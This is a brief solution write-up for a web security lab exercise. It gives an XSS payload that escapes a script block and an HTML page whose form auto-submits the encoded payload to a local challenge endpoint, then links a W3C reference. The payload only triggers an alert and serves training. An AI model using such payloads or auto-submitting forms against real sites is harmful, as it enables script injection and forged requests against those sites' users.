# Challenge 1
Solution and further references for *challenge 1*.

<details>
 <summary>Spoiler: Solution for challenge 1</summary>

**Payload**:
```html
</script><script>alert(document.domain)//
```

**Exploit**:
```html
<html>
  <body>
    <form action="http://127.0.0.1/challenge1.php" method="POST" id="attackForm">
      <input type="hidden" name="q" value="&lt;&#47;script&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&#47;&#47;" />
      <input type="submit" value="Submit request" />
    </form>
 <script>attackForm.submit()</script>
  </body>
</html>
```
</details>

## References
Additional information:
* https://github.com/w3c/html/issues/1617#issuecomment-418205892